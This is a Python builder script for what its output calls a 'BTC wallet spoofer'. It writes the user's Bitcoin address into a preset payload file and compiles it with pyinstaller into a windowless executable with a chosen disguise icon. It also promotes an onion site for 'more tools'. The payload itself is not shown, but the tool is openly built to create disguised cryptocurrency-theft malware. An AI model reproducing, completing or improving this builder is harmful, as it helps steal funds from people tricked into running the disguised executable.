import os,sys

class ShellBody(object):  #Main Class 

	def __init__(self, art="art.txt", YBW=0, presets=0,FN=0,FI=0):
		super(ShellBody, self).__init__()

		self.art = art
		self.YBW = YBW
		self.FN = FN
		self.FI = FI
		self.presets = presets

	def LoadArt(load): #Loading Ascii art From load.art
		with open(load.art, "r") as art: 

			for line in art:
				print(line.strip("\n"))

	def validated(load): #Check If wallet to be Standard Format
		if len(load.YBW) >= 26 and len(load.YBW) <=58:
			if load.YBW[0] == "1" or load.YBW[0] == "3" or load.YBW[0] == "b" :
				return(True)
		else : 
			return(False)
	
	def EditPresets(load): #Load Presets and Edite The default Line to the wallet
		with open(load.presets,"r") as pre_r:
			with open(str(load.FN)+".py","w") as pre_w:

				for readL in pre_r:
					if readL.startswith("NewCCB") :
						pre_w.write("NewCCB = '{}'\n".format(load.YBW))
					else :
						pre_w.write(readL)
	def build(load): #Open up Cmd and run pyinstaller to Build the Spoofer
		UselessFiles = ["{}.py".format(load.FN),"build","__pycache__"]
		os.system('pyinstaller --onefile -w --icon="{}" "{}.py"'.format(load.FI,load.FN)) #Build the fie 
		try:
			for file in UselessFiles:os.remove(file) #Remove the Junks 
		except:
			print("To remove Useless files YOU need to Re-run program as adminator") #Error
		print("\nDone!")





if __name__ == '__main__': #Run 
	Shell = ShellBody(art="art.txt") #define The class
	Shell.LoadArt() # Load the ascii art
	print("More Tools : cy4nxsbtnk3e5wy5.onion")
	print("Exmaple: py RunThis.py YourBtcwallet FileName FileIconName\n")
	print("Note: MAKE sure you have pyinstaller installed and you image is .ico 64x64")
	print("and your text name is UTF-8\n")
	try:
		Shell.YBW = sys.argv[1] #User BTC Wellet
		Shell.FN = sys.argv[2]  #Ask for File name 
		Shell.FI = sys.argv[3]  #Ask for icon for file
	except Exception as e: # ERROR
		print("Help		\n")
		print("Exmaple: py RunThis.py YourBtcwallet FileName FileIconName")
		quit() # Quit if thier is an error 
	
	if Shell.validated() == True : # Check If wallet to be Standard Format & Load preset
		Shell.presets = "preset.py"
		Shell.EditPresets() 
	if(input("(y,n) Build > ") == "y"): # Build  The preset
		Shell.build()
		print("your BTC wallet spoofer -> \\dist\\{}.exe".format(Shell.FN))



